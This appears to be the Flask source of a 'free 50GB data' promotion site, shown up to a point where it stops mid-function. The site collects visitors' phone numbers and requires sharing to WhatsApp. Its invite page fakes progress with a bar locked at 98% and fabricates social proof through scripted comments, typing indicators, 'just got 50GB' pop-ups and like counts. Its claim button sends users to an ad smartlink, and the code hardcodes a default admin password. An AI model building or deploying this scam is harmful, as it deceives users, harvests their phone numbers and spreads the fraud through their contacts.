import os
import sqlite3
import secrets
from datetime import datetime
from functools import wraps
from urllib.parse import quote

from flask import (
    Flask,
    request,
    redirect,
    url_for,
    session,
    render_template_string,
    send_from_directory,
    flash,
    jsonify
)

from werkzeug.utils import secure_filename


# ============================================================
# APP SETTINGS
# ============================================================

app = Flask(__name__)

app.secret_key = os.environ.get(
    "SECRET_KEY",
    "change-this-secret-key"
)

ADMIN_USERNAME = os.environ.get(
    "ADMIN_USERNAME",
    "admin"
)

ADMIN_PASSWORD = os.environ.get(
    "ADMIN_PASSWORD",
    "JEPHTHAH"
)

SITE_URL = os.environ.get(
    "SITE_URL",
    "https://free-50gb-for-all-network-s.onrender.com"
).rstrip("/")

DATABASE = "promotion.db"

UPLOAD_FOLDER = "uploads"

MAX_CONTENT_LENGTH = 8 * 1024 * 1024

ALLOWED_EXTENSIONS = {
    "jpg",
    "jpeg",
    "png",
    "webp"
}

app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
app.config["MAX_CONTENT_LENGTH"] = MAX_CONTENT_LENGTH

os.makedirs(UPLOAD_FOLDER, exist_ok=True)


# ============================================================
# DATABASE
# ============================================================

def get_db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn


def setup_database():
    conn = get_db()

    conn.execute("""
        CREATE TABLE IF NOT EXISTS campaign (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            heading TEXT NOT NULL,
            message TEXT NOT NULL,
            referral_target INTEGER NOT NULL DEFAULT 20,
            offer_heading TEXT NOT NULL DEFAULT '🎁 Claim Your 50GB',
            offer_text TEXT NOT NULL DEFAULT 'Enter your phone number below to continue.',
            continue_button_text TEXT NOT NULL DEFAULT 'CONTINUE',
            small_note TEXT NOT NULL DEFAULT 'Follow the steps to continue with the promotion.',
            share_instruction TEXT NOT NULL DEFAULT 'Share to 10 WhatsApp groups and 10 friends to unlock your 50GB offer. 🎁',
            share_button_text TEXT NOT NULL DEFAULT 'SHARE TO CLAIM YOUR 50GB',
            claim_button_text TEXT NOT NULL DEFAULT 'CLAIM YOUR 50GB OFFER',
            claim_ready_text TEXT NOT NULL DEFAULT 'Your 50GB offer is now ready to be claimed.',
            back_text TEXT NOT NULL DEFAULT 'BACK TO OFFER',
            privacy_link_text TEXT NOT NULL DEFAULT 'Privacy Policy',
            terms_link_text TEXT NOT NULL DEFAULT 'Terms',
            comments_title TEXT NOT NULL DEFAULT 'Recent Comments & Proofs',
            comment_input_placeholder TEXT NOT NULL DEFAULT 'Write a comment or paste image receipt...',
            comment_submit_text TEXT NOT NULL DEFAULT 'Post',
            image TEXT,
            social_image TEXT
        )
    """)

    columns_to_add = [
        ("offer_heading", "TEXT NOT NULL DEFAULT '🎁 Claim Your 50GB'"),
        ("offer_text", "TEXT NOT NULL DEFAULT 'Enter your phone number below to continue.'"),
        ("continue_button_text", "TEXT NOT NULL DEFAULT 'CONTINUE'"),
        ("small_note", "TEXT NOT NULL DEFAULT 'Follow the steps to continue with the promotion.'"),
        ("share_instruction", "TEXT NOT NULL DEFAULT 'Share to 10 WhatsApp groups and 10 friends to unlock your 50GB offer. 🎁'"),
        ("share_button_text", "TEXT NOT NULL DEFAULT 'SHARE TO CLAIM YOUR 50GB'"),
        ("claim_button_text", "TEXT NOT NULL DEFAULT 'CLAIM YOUR 50GB OFFER'"),
        ("claim_ready_text", "TEXT NOT NULL DEFAULT 'Your 50GB offer is now ready to be claimed.'"),
        ("back_text", "TEXT NOT NULL DEFAULT 'BACK TO OFFER'"),
        ("privacy_link_text", "TEXT NOT NULL DEFAULT 'Privacy Policy'"),
        ("terms_link_text", "TEXT NOT NULL DEFAULT 'Terms'"),
        ("comments_title", "TEXT NOT NULL DEFAULT 'Recent Comments & Proofs'"),
        ("comment_input_placeholder", "TEXT NOT NULL DEFAULT 'Write a comment or paste image receipt...'"),
        ("comment_submit_text", "TEXT NOT NULL DEFAULT 'Post'")
    ]
    for col_name, col_def in columns_to_add:
        try:
            conn.execute(f"ALTER TABLE campaign ADD COLUMN {col_name} {col_def}")
        except sqlite3.OperationalError:
            pass

    conn.execute("""
        CREATE TABLE IF NOT EXISTS participants (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT NOT NULL UNIQUE,
            referral_code TEXT NOT NULL UNIQUE,
            referred_by TEXT,
            created_at TEXT NOT NULL
        )
    """)

    conn.execute("""
        CREATE TABLE IF NOT EXISTS share_clicks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            referral_code TEXT NOT NULL,
            created_at TEXT NOT NULL
        )
    """)

    conn.execute("""
        CREATE TABLE IF NOT EXISTS credited_numbers (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            masked_phone TEXT NOT NULL,
            created_at TEXT NOT NULL
        )
    """)

    existing_campaign = conn.execute(
        "SELECT id FROM campaign LIMIT 1"
    ).fetchone()

    if not existing_campaign:
        conn.execute("""
            INSERT INTO campaign
            (heading, message, referral_target, offer_heading, offer_text, continue_button_text, small_note, share_instruction, share_button_text, claim_button_text, claim_ready_text, back_text, privacy_link_text, terms_link_text, comments_title, comment_input_placeholder, comment_submit_text, image, social_image)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            "FREE 50GB FOR ALL NETWORK'S",
            "🎁 Take part in our promotional offer and follow the steps below to claim your 50GB offer.",
            20,
            "🎁 Claim Your 50GB",
            "Enter your phone number below to continue.",
            "CONTINUE",
            "Follow the steps to continue with the promotion.",
            "Share to 10 WhatsApp groups and 10 friends to unlock your 50GB offer. 🎁",
            "SHARE TO CLAIM YOUR 50GB",
            "CLAIM YOUR 50GB OFFER",
            "Your 50GB offer is now ready to be claimed.",
            "BACK TO OFFER",
            "Privacy Policy",
            "Terms",
            "Recent Comments & Proofs",
            "Write a comment or paste image receipt...",
            "Post",
            None,
            None
        ))

    conn.commit()
    conn.close()


# ============================================================
# CAMPAIGN
# ============================================================

def get_campaign():
    conn = get_db()
    campaign = conn.execute(
        "SELECT * FROM campaign ORDER BY id ASC LIMIT 1"
    ).fetchone()
    conn.close()
    return campaign


# ============================================================
# HELPERS
# ============================================================

def allowed_file(filename):
    return (
        "." in filename
        and filename.rsplit(".", 1)[1].lower()
        in ALLOWED_EXTENSIONS
    )


def mask_phone(phone):
    digits = "".join(
        character
        for character in phone
        if character.isdigit()
    )

    if len(digits) <= 7:
        return "*" * len(digits)

    return digits[:4] + "****" + digits[-3:]


def get_referral_count(code):
    conn = get_db()
    result = conn.execute(
        """
        SELECT COUNT(*) AS total
        FROM share_clicks
        WHERE referral_code = ?
        """,
        (code,)
    ).fetchone()
    conn.close()
    return result["total"]


def admin_required(function):
    @wraps(function)
    def decorated_function(*args, **kwargs):
        if not session.get("admin_logged_in"):
            return redirect(url_for("admin_login"))
        return function(*args, **kwargs)
    return decorated_function


# ============================================================
# PUBLIC HOME PAGE
# ============================================================

@app.route("/")
def home():
    campaign = get_campaign()
    og_image = url_for('uploaded_file', filename=campaign['social_image'], _external=True) if campaign['social_image'] else (url_for('uploaded_file', filename=campaign['image'], _external=True) if campaign['image'] else "")
    current_date = datetime.utcnow().strftime("%Y-%m-%d")

    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="ppck-ver" content="0fe643909cb403a6ff5d3027d0dce871" />
    <meta name="monetag" content="8270a4c02d3fa8c6094bc68970d0fc47">
    <meta name="author" content="Admin">
    <meta name="date" content="{{ current_date }}">
    <meta name="description" content="Take part in our exclusive promotional offer and follow the simple steps below to claim your free 50GB data offer now.">

    <title>{{ campaign['heading'] }}</title>

    <meta property="og:title" content="Claim 50GB Free Data for All Networks">
    <meta property="og:description" content="Take part in our exclusive promotional offer and follow the simple steps below to claim your free 50GB data offer now.">
    <meta property="og:image" content="{{ og_image }}">
    <meta property="og:type" content="website">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:description" content="Take part in our exclusive promotional offer and follow the simple steps below to claim your free 50GB data offer now.">
    <meta name="twitter:image" content="{{ og_image }}">

    {% if og_image %}
    <link rel="apple-touch-icon" sizes="180x180" href="{{ og_image }}">
    {% endif %}

    <script src="https://quge5.com/88/tag.min.js" data-zone="292606" async data-cfasync="false"></script>

    <style>
        * { box-sizing: border-box; }
        body { margin: 0; font-family: Arial, sans-serif; background: #f0f4f8; color: #222; }
        .container { max-width: 600px; margin: auto; min-height: 100vh; background: white; }
        .banner { width: 100%; background: #111; }
        .banner img { width: 100%; display: block; max-height: 430px; object-fit: cover; }
        .content { padding: 24px 18px; }
        h1 { text-align: center; margin-top: 0; }
        .message { text-align: center; line-height: 1.6; }
        .offer { margin-top: 20px; padding: 20px; border-radius: 14px; background: #e8f7ff; text-align: center; }
        .offer h2 { margin-top: 0; }
        input { width: 100%; padding: 15px; margin-top: 15px; border: 1px solid #ccc; border-radius: 10px; font-size: 16px; }
        button { width: 100%; padding: 15px; margin-top: 12px; border: none; border-radius: 10px; background: #0077b6; color: white; font-size: 16px; font-weight: bold; cursor: pointer; }
        .small { text-align: center; color: #777; font-size: 13px; margin-top: 15px; }
        .credit-notification { position: fixed; left: 50%; bottom: 20px; transform: translateX(-50%); width: calc(100% - 30px); max-width: 520px; background: #111; color: white; padding: 14px 45px 14px 16px; border-radius: 12px; box-shadow: 0 5px 25px rgba(0,0,0,.25); display: none; z-index: 9999; font-size: 14px; }
        .credit-notification button { position: absolute; right: 8px; top: 4px; width: auto; margin: 0; padding: 5px 9px; background: transparent; color: white; font-size: 18px; }
        footer { text-align: center; padding: 25px 10px; font-size: 13px; color: #777; }
        footer a { color: #0077b6; text-decoration: none; margin: 0 7px; }
    </style>
</head>
<body>

<div class="container">
    {% if campaign['image'] %}
    <div class="banner">
        <img src="{{ url_for('uploaded_file', filename=campaign['image']) }}" alt="Promotion">
    </div>
    {% endif %}

    <div class="content">
        <h1>{{ campaign['heading'] }}</h1>
        <div class="message">{{ campaign['message'] }}</div>

        <div class="offer">
            <h2>{{ campaign['offer_heading'] }}</h2>
            <p>{{ campaign['offer_text'] }}</p>
        </div>

        <form method="POST" action="{{ url_for('claim') }}">
            <input type="text" name="phone" placeholder="Enter your phone number" required>
            <button type="submit">{{ campaign['continue_button_text'] }}</button>
        </form>

        <div class="small">{{ campaign['small_note'] }}</div>
    </div>

    <footer>
        <a href="{{ url_for('privacy') }}">{{ campaign['privacy_link_text'] }}</a> |
        <a href="{{ url_for('terms') }}">{{ campaign['terms_link_text'] }}</a>
    </footer>
</div>

<div id="creditNotification" class="credit-notification">
    <span id="creditText"></span>
    <button type="button" onclick="closeCreditNotification()">×</button>
</div>

<script>
let creditedNumbers = [];
let currentCreditIndex = 0;
let creditTimer = null;

async function loadCreditedNumbers() {
    try {
        const response = {{ url_for('api_credited_numbers') | tojson }};
        const res = await fetch(response);
        const data = await res.json();
        creditedNumbers = data.numbers || [];
        if (creditedNumbers.length > 0) {
            showNextCredit();
            if (!creditTimer) {
                creditTimer = setInterval(showNextCredit, 4000);
            }
        }
    } catch (error) {
        console.log("Notification loading error");
    }
}

function showNextCredit() {
    if (creditedNumbers.length === 0) return;
    const number = creditedNumbers[currentCreditIndex % creditedNumbers.length];
    document.getElementById("creditText").textContent = number + " just got 50GB 🎉";
    document.getElementById("creditNotification").style.display = "block";
    currentCreditIndex++;
}

function closeCreditNotification() {
    document.getElementById("creditNotification").style.display = "none";
}

loadCreditedNumbers();
</script>
</body>
</html>
""", campaign=campaign, og_image=og_image, current_date=current_date)


# ============================================================
# CLAIM / NORMAL REGISTRATION
# ============================================================

@app.route("/claim", methods=["POST"])
def claim():
    phone = request.form.get("phone", "").strip()
    if not phone:
        return redirect(url_for("home"))

    conn = get_db()
    existing = conn.execute(
        "SELECT referral_code FROM participants WHERE phone = ?",
        (phone,)
    ).fetchone()
    conn.close()

    if existing:
        return redirect(url_for("invite", code=existing["referral_code"]))

    referral_code = secrets.token_urlsafe(8)
    conn = get_db()
    conn.execute("""
        INSERT INTO participants (phone, referral_code, referred_by, created_at)
        VALUES (?, ?, ?, ?)
    """, (phone, referral_code, None, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()

    return redirect(url_for("invite", code=referral_code))


# ============================================================
# REFERRAL LANDING PAGE
# ============================================================

@app.route("/join/<referrer>")
def join_referral(referrer):
    conn = get_db()
    referrer_user = conn.execute(
        "SELECT id FROM participants WHERE referral_code = ?",
        (referrer,)
    ).fetchone()
    conn.close()

    if not referrer_user:
        return redirect(url_for("home"))

    campaign = get_campaign()
    og_image = url_for('uploaded_file', filename=campaign['social_image'], _external=True) if campaign['social_image'] else (url_for('uploaded_file', filename=campaign['image'], _external=True) if campaign['image'] else "")
    current_date = datetime.utcnow().strftime("%Y-%m-%d")

    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="ppck-ver" content="0fe643909cb403a6ff5d3027d0dce871" />
    <meta name="monetag" content="8270a4c02d3fa8c6094bc68970d0fc47">
    <meta name="author" content="Admin">
    <meta name="date" content="{{ current_date }}">
    <meta name="description" content="Take part in our exclusive promotional offer and follow the simple steps below to claim your free 50GB data offer now.">

    <title>{{ campaign['heading'] }}</title>

    <meta property="og:title" content="Claim 50GB Free Data for All Networks">
    <meta property="og:description" content="Take part in our exclusive promotional offer and follow the simple steps below to claim your free 50GB data offer now.">
    <meta property="og:image" content="{{ og_image }}">
    <meta property="og:type" content="website">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:description" content="Take part in our exclusive promotional offer and follow the simple steps below to claim your free 50GB data offer now.">
    <meta name="twitter:image" content="{{ og_image }}">

    {% if og_image %}
    <link rel="apple-touch-icon" sizes="180x180" href="{{ og_image }}">
    {% endif %}

    <script src="https://quge5.com/88/tag.min.js" data-zone="292606" async data-cfasync="false"></script>

    <style>
        * { box-sizing: border-box; }
        body { margin: 0; font-family: Arial, sans-serif; background: #f0f4f8; color: #222; }
        .container { max-width: 600px; margin: auto; min-height: 100vh; background: white; }
        .banner { width: 100%; background: #111; }
        .banner img { width: 100%; display: block; max-height: 430px; object-fit: cover; }
        .content { padding: 24px 18px; }
        h1 { text-align: center; margin-top: 0; }
        .message { text-align: center; line-height: 1.6; }
        .offer { margin-top: 20px; padding: 20px; border-radius: 14px; background: #e8f7ff; text-align: center; }
        .offer h2 { margin-top: 0; }
        input { width: 100%; padding: 15px; margin-top: 15px; border: 1px solid #ccc; border-radius: 10px; font-size: 16px; }
        button { width: 100%; padding: 15px; margin-top: 12px; border: none; border-radius: 10px; background: #0077b6; color: white; font-size: 16px; font-weight: bold; cursor: pointer; }
        .small { text-align: center; color: #777; font-size: 13px; margin-top: 15px; }
        .credit-notification { position: fixed; left: 50%; bottom: 20px; transform: translateX(-50%); width: calc(100% - 30px); max-width: 520px; background: #111; color: white; padding: 14px 45px 14px 16px; border-radius: 12px; box-shadow: 0 5px 25px rgba(0,0,0,.25); display: none; z-index: 9999; font-size: 14px; }
        .credit-notification button { position: absolute; right: 8px; top: 4px; width: auto; margin: 0; padding: 5px 9px; background: transparent; color: white; font-size: 18px; }
        footer { text-align: center; padding: 25px 10px; font-size: 13px; color: #777; }
        footer a { color: #0077b6; text-decoration: none; margin: 0 7px; }
    </style>
</head>
<body>

<div class="container">
    {% if campaign['image'] %}
    <div class="banner">
        <img src="{{ url_for('uploaded_file', filename=campaign['image']) }}" alt="Promotion">
    </div>
    {% endif %}

    <div class="content">
        <h1>{{ campaign['heading'] }}</h1>
        <div class="message">{{ campaign['message'] }}</div>

        <div class="offer">
            <h2>{{ campaign['offer_heading'] }}</h2>
            <p>{{ campaign['offer_text'] }}</p>
        </div>

        <form method="POST" action="{{ url_for('register_referral') }}">
            <input type="text" name="phone" placeholder="Enter your phone number" required>
            <input type="hidden" name="referrer" value="{{ referrer }}">
            <button type="submit">{{ campaign['continue_button_text'] }}</button>
        </form>

        <div class="small">{{ campaign['small_note'] }}</div>
    </div>

    <footer>
        <a href="{{ url_for('privacy') }}">{{ campaign['privacy_link_text'] }}</a> |
        <a href="{{ url_for('terms') }}">{{ campaign['terms_link_text'] }}</a>
    </footer>
</div>

<div id="creditNotification" class="credit-notification">
    <span id="creditText"></span>
    <button type="button" onclick="closeCreditNotification()">×</button>
</div>

<script>
let creditedNumbers = [];
let currentCreditIndex = 0;
let creditTimer = null;

async function loadCreditedNumbers() {
    try {
        const res = await fetch("{{ url_for('api_credited_numbers') }}");
        const data = await res.json();
        creditedNumbers = data.numbers || [];
        if (creditedNumbers.length > 0) {
            showNextCredit();
            if (!creditTimer) {
                creditTimer = setInterval(showNextCredit, 4000);
            }
        }
    } catch (error) {
        console.log("Notification loading error");
    }
}

function showNextCredit() {
    if (creditedNumbers.length === 0) return;
    const number = creditedNumbers[currentCreditIndex % creditedNumbers.length];
    document.getElementById("creditText").textContent = number + " just got 50GB 🎉";
    document.getElementById("creditNotification").style.display = "block";
    currentCreditIndex++;
}

function closeCreditNotification() {
    document.getElementById("creditNotification").style.display = "none";
}

loadCreditedNumbers();
</script>
</body>
</html>
""", campaign=campaign, referrer=referrer, og_image=og_image, current_date=current_date)


# ============================================================
# REGISTER A REFERRED PERSON
# ============================================================

@app.route("/register-referral", methods=["POST"])
def register_referral():
    phone = request.form.get("phone", "").strip()
    referrer = request.form.get("referrer", "").strip()

    if not phone:
        return redirect(url_for("home"))

    conn = get_db()
    existing = conn.execute(
        "SELECT referral_code FROM participants WHERE phone = ?",
        (phone,)
    ).fetchone()

    if existing:
        conn.close()
        return redirect(url_for("invite", code=existing["referral_code"]))

    referrer_user = conn.execute(
        "SELECT id FROM participants WHERE referral_code = ?",
        (referrer,)
    ).fetchone()

    if not referrer_user:
        conn.close()
        return redirect(url_for("home"))

    new_referral_code = secrets.token_urlsafe(8)
    conn.execute("""
        INSERT INTO participants (phone, referral_code, referred_by, created_at)
        VALUES (?, ?, ?, ?)
    """, (phone, new_referral_code, referrer, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()

    return redirect(url_for("invite", code=new_referral_code))


# ============================================================
# PERSONAL REFERRAL / SHARE PAGE WITH VIDEO LOGIC, COMMENTS & DYNAMIC ADS
# ============================================================

@app.route("/invite/<code>")
def invite(code):
    conn = get_db()
    participant = conn.execute(
        "SELECT * FROM participants WHERE referral_code = ?",
        (code,)
    ).fetchone()
    conn.close()

    if not participant:
        return redirect(url_for("home"))

    campaign = get_campaign()
    share_link = SITE_URL + url_for("join_referral", referrer=code)

    whatsapp_message = (
        "🎉 FREE 50GB FOR ALL NETWORKS!\n\n"
        "🎁 Take part in our promotional offer and follow the steps to claim your 50GB free data now.\n\n"
        "👉 Click the link to claim:\n"
        + share_link
    )
    whatsapp_url = "https://wa.me/?text=" + quote(whatsapp_message)

    og_image = url_for('uploaded_file', filename=campaign['social_image'], _external=True) if campaign['social_image'] else (url_for('uploaded_file', filename=campaign['image'], _external=True) if campaign['image'] else "")
    current_date = datetime.utcnow().strftime("%Y-%m-%d")

    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="ppck-ver" content="0fe643909cb403a6ff5d3027d0dce871" />
    <meta name="monetag" content="8270a4c02d3fa8c6094bc68970d0fc47">
    <meta name="author" content="Admin">
    <meta name="date" content="{{ current_date }}">
    <meta name="description" content="Take part in our exclusive promotional offer and follow the simple steps below to claim your free 50GB data offer now.">

    <title>Claim Your 50GB</title>

    <meta property="og:title" content="Claim 50GB Free Data for All Networks">
    <meta property="og:description" content="Take part in our exclusive promotional offer and follow the simple steps below to claim your free 50GB data offer now.">
    <meta property="og:image" content="{{ og_image }}">
    <meta property="og:type" content="website">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:description" content="Take part in our exclusive promotional offer and follow the simple steps below to claim your free 50GB data offer now.">
    <meta name="twitter:image" content="{{ og_image }}">

    {% if og_image %}
    <link rel="apple-touch-icon" sizes="180x180" href="{{ og_image }}">
    {% endif %}

    <script src="https://quge5.com/88/tag.min.js" data-zone="292606" async data-cfasync="false"></script>

    <style>
        * { box-sizing: border-box; }
        body { margin: 0; font-family: Arial, sans-serif; background: #f0f4f8; color: #222; }
        .container { max-width: 600px; margin: auto; min-height: 100vh; background: white; padding: 25px 18px; }
        .card { background: white; border-radius: 16px; padding: 22px; box-shadow: 0 4px 18px rgba(0,0,0,.08); }
        h1 { text-align: center; margin-top: 0; }
        .offer-title { text-align: center; font-size: 22px; font-weight: bold; margin: 15px 0; }
        .progress-text { text-align: center; font-size: 20px; font-weight: bold; margin: 20px 0; }
        .progress { width: 100%; height: 16px; background: #ddd; border-radius: 20px; overflow: hidden; }
        .progress-bar { height: 100%; background: #25D366; width: 0%; transition: width 0.4s ease; }
        .message { text-align: center; line-height: 1.6; margin: 20px 0; }
        .share-button { display: block; width: 100%; padding: 16px; border-radius: 10px; background: #25D366; color: white; text-decoration: none; text-align: center; font-weight: bold; font-size: 16px; border: none; cursor: pointer; margin-bottom: 12px; }
        .claim-button { display: block; width: 100%; padding: 17px; border-radius: 10px; background: #0077b6; color: white; text-align: center; font-weight: bold; font-size: 17px; border: none; cursor: pointer; margin-bottom: 12px; text-decoration: none; }
        .claim-ready { text-align: center; padding: 15px; background: #e8f7ff; border-radius: 12px; margin-bottom: 18px; line-height: 1.5; }
        .back { display: block; text-align: center; margin-top: 20px; color: #0077b6; text-decoration: none; }
        
        /* Comments section styling */
        .comments-section { margin-top: 35px; border-top: 2px solid #eee; padding-top: 20px; }
        .comments-header { font-weight: bold; font-size: 18px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }
        .comment-item { display: flex; gap: 10px; margin-bottom: 15px; font-size: 14px; line-height: 1.4; background: #f9f9f9; padding: 10px; border-radius: 8px; }
        .comment-avatar { width: 35px; height: 35px; background: #0077b6; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; flex-shrink: 0; }
        .comment-content { flex-grow: 1; }
        .comment-author { font-weight: bold; color: #333; margin-bottom: 2px; }
        .comment-text { color: #555; }
        .comment-img { max-width: 100%; border-radius: 6px; margin-top: 6px; display: block; }
        .typing-indicator { font-style: italic; color: #777; font-size: 13px; margin-bottom: 15px; min-height: 20px; }
        .comment-form { margin-top: 15px; display: flex; flex-direction: column; gap: 10px; }
        .comment-form textarea { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 8px; font-family: Arial, sans-serif; resize: vertical; min-height: 60px; }
        .comment-form input[type="file"] { font-size: 13px; }
        .comment-form button { margin-top: 0; padding: 10px; background: #0077b6; }
    </style>
</head>
<body>

<div class="container">
    <div class="card">
        <h1>Claim Your 50GB</h1>

        <div class="offer-title" id="offerTitleText">
            🎁 Share to claim your 50GB
        </div>

        <div class="progress-text" id="progressText">0%</div>

        <div class="progress">
            <div class="progress-bar" id="progressBar"></div>
        </div>

        <div class="message" id="instructionBox">
            {{ campaign['share_instruction'] }}
        </div>

        <!-- Multiple action buttons pointing to Smartlink / Share loop -->
        <a href="{{ whatsapp_url }}" class="share-button" id="actionButton" target="_blank">
            {{ campaign['share_button_text'] }}
        </a>

        <a href="https://auctionr.org/4/37414a1e1909ab24913b0b081859abad" class="claim-button" id="secondActionButton" target="_blank" style="display:none;">
            {{ campaign['claim_button_text'] }}
        </a>

        <div class="comments-section">
            <div class="comments-header">
                <span id="commentsTitleLabel">{{ campaign['comments_title'] }}</span>
                <span style="font-size: 13px; color: #777;" id="likesCounter">❤️ 343 likes</span>
            </div>

            <div class="typing-indicator" id="typingIndicator"></div>

            <div id="commentsList">
                <div class="comment-item">
                    <div class="comment-avatar" style="background:#25D366;">NE</div>
                    <div class="comment-content">
                        <div class="comment-author">Ngozi Eze</div>
                        <div class="comment-text">This is how celebrities should celebrate with the people. I got mine credited! 🎉</div>
                    </div>
                </div>
                <div class="comment-item">
                    <div class="comment-avatar" style="background:#c1121f;">AB</div>
                    <div class="comment-content">
                        <div class="comment-author">Aisha Bello</div>
                        <div class="comment-text">I got mine + my wife's. Double win 😂</div>
                    </div>
                </div>
                <div class="comment-item">
                    <div class="comment-avatar" style="background:#0077b6;">SO</div>
                    <div class="comment-content">
                        <div class="comment-author">Segun Ogunleye</div>
                        <div class="comment-text">It reflected in less than 10 minutes for me. Amazing offer!</div>
                    </div>
                </div>
            </div>

            <!-- Comment input form where user can comment and attach image receipts -->
            <div class="comment-form">
                <textarea id="userCommentInput" placeholder="{{ campaign['comment_input_placeholder'] }}"></textarea>
                <input type="file" id="userCommentImage" accept="image/*">
                <button type="button" onclick="postUserComment()">{{ campaign['comment_submit_text'] }}</button>
            </div>
        </div>

        <a href="{{ url_for('home') }}" class="back">{{ campaign['back_text'] }}</a>
    </div>
</div>

<script>
// Simulated fast/slow video counter logic
let currentProgress = parseInt(localStorage.getItem("progress_{{ code }}") || "0");
let clickState = parseInt(localStorage.getItem("clicks_{{ code }}") || "0");
const smartLinkUrl = "https://auctionr.org/4/37414a1e1909ab24913b0b081859abad";

const progressBar = document.getElementById("progressBar");
const progressText = document.getElementById("progressText");
const actionButton = document.getElementById("actionButton");
const secondActionButton = document.getElementById("secondActionButton");
const instructionBox = document.getElementById("instructionBox");
const offerTitleText = document.getElementById("offerTitleText");

function updateDisplay() {
    progressBar.style.width = currentProgress + "%";
    progressText.textContent = currentProgress + "%";

    if (currentProgress >= 98) {
        currentProgress = 98;
        progressBar.style.width = "98%";
        progressText.textContent = "98%";
        offerTitleText.textContent = "🎉 Claim Your 50GB Offer";
        instructionBox.textContent = "{{ campaign['claim_ready_text'] }}";
        actionButton.textContent = "{{ campaign['claim_button_text'] }}";
        actionButton.style.background = "#0077b6";
        secondActionButton.style.display = "block";
    }
}

// Initial jump logic on load if 0
if (currentProgress === 0) {
    currentProgress = 50;
    updateDisplay();
    setTimeout(() => {
        currentProgress = 60;
        updateDisplay();
    }, 400);
    setTimeout(() => {
        currentProgress = 90;
        updateDisplay();
        localStorage.setItem("progress_{{ code }}", currentProgress);
    }, 800);
} else {
    updateDisplay();
}

actionButton.addEventListener("click", function(e) {
    if (currentProgress < 98) {
        // Fast counter click phase
        e.preventDefault();
        clickState++;
        if (currentProgress === 90) {
            currentProgress = 93;
        } else if (currentProgress === 93) {
            currentProgress = 96;
        } else if (currentProgress === 96) {
            currentProgress = 98;
        } else {
            currentProgress = 98;
        }
        localStorage.setItem("progress_{{ code }}", currentProgress);
        updateDisplay();

        // Trigger WhatsApp share loop
        window.open("{{ whatsapp_url }}", "_blank");
    } else {
        // Reached 98% -> opens smartlink ad redirection, returns back to 98%
        clickState++;
        if (clickState % 2 === 0) {
            // After clicking 2 times, ensure state stays locked at 98% asking to share or claim
        }
    }
});

// Typing indicator and dynamic comments simulation
const typingUsers = [
    "Tunde Adeyemi is typing...",
    "Chukwumeka Nwosu is typing...",
    "Hauwa Suleiman is typing...",
    "Emeka Obi is typing..."
];

const simulatedComments = [
    { name: "Folake Adebayo", color: "#e63946", text: "I was doubting at first but it came through!" },
    { name: "Ibrahim Musa", color: "#457b9d", text: "This is pure love for the people. Thank you!" },
    { name: "Chiamaka Nnamdi", color: "#2a9d8f", text: "Just finished the registration, fingers crossed 🤞" },
    { name: "Yusuf Abdullahi", color: "#f4a261", text: "It reflected in less than 10 minutes for me." }
];

let typingIndex = 0;
setInterval(() => {
    document.getElementById("typingIndicator").textContent = typingUsers[typingIndex];
    setTimeout(() => {
        document.getElementById("typingIndicator").textContent = "";
    }, 2500);
    typingIndex = (typingIndex + 1) % typingUsers.length;
}, 6000);

let commentIndex = 0;
setInterval(() => {
    const comment = simulatedComments[commentIndex];
    const list = document.getElementById("commentsList");
    const div = document.createElement("div");
    div.className = "comment-item";
    div.innerHTML = `
        <div class="comment-avatar" style="background:${comment.color}">${comment.name.substring(0,2).toUpperCase()}</div>
        <div class="comment-content">
            <div class="comment-author">${comment.name}</div>
            <div class="comment-text">${comment.text}</div>
        </div>
    `;
    list.prepend(div);
    commentIndex = (commentIndex + 1) % simulatedComments.length;

    let likes = 343 + Math.floor(Math.random() * 5);
    document.getElementById("likesCounter").textContent = "❤️ " + likes + " likes";
}, 9000);

// Local user comment function (only shows locally for the user)
function postUserComment() {
    const textInput = document.getElementById("userCommentInput");
    const imageInput = document.getElementById("userCommentImage");
    const text = textInput.value.trim();

    if (!text && imageInput.files.length === 0) return;

    const list = document.getElementById("commentsList");
    const div = document.createElement("div");
    div.className = "comment-item";

    let imgHtml = "";
    if (imageInput.files && imageInput.files[0]) {
        const reader = new FileReader();
        reader.onload = function(e) {
            div.querySelector(".comment-content").innerHTML += `<img src="${e.target.result}" class="comment-img">`;
        };
        reader.readAsDataURL(imageInput.files[0]);
    }

    div.innerHTML = `
        <div class="comment-avatar" style="background:#1d3557;">You</div>
        <div class="comment-content">
            <div class="comment-author">You (Verified User)</div>
            <div class="comment-text">${text || "Attached payment receipt proof."}</div>
        </div>
    `;
    list.prepend(div);
    textInput.value = "";
    imageInput.value = "";
}
</script>

</body>
</html>
""",
        code=code,
        campaign=campaign,
        whatsapp_url=whatsapp_url,
        og_image=og_image,
        current_date=current_date
    )


# ============================================================
# RECORD SHARE CLICK
# ============================================================

@app.route("/record-share/<code>", methods=["POST"])
def record_share(code):
    conn = get_db()
    participant = conn.execute(
        "SELECT id FROM participants WHERE referral_code = ?",
        (code,)
    ).fetchone()

    if not participant:
        conn.close()
        return jsonify({"success": False}), 404

    campaign = conn.execute(
        "SELECT referral_target FROM campaign ORDER BY id ASC LIMIT 1"
    ).fetchone()

    target = int(campaign["referral_target"] or 20)
    current_count = conn.execute(
